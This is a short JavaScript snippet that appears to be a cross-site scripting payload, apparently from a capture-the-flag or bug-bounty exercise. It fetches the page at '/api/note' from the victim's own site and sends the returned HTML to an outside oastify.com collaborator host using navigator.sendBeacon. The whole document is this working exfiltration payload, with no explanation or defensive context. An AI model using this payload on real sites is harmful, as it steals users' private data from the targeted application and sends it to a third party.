fetch('/api/note')
  .then((response) => {
    return response.text();
  })
  .then((html) => {
    navigator.sendBeacon("http://4inepx81jwmwwxr8m157oxm86zcq0go5.oastify.com", html) 
  });
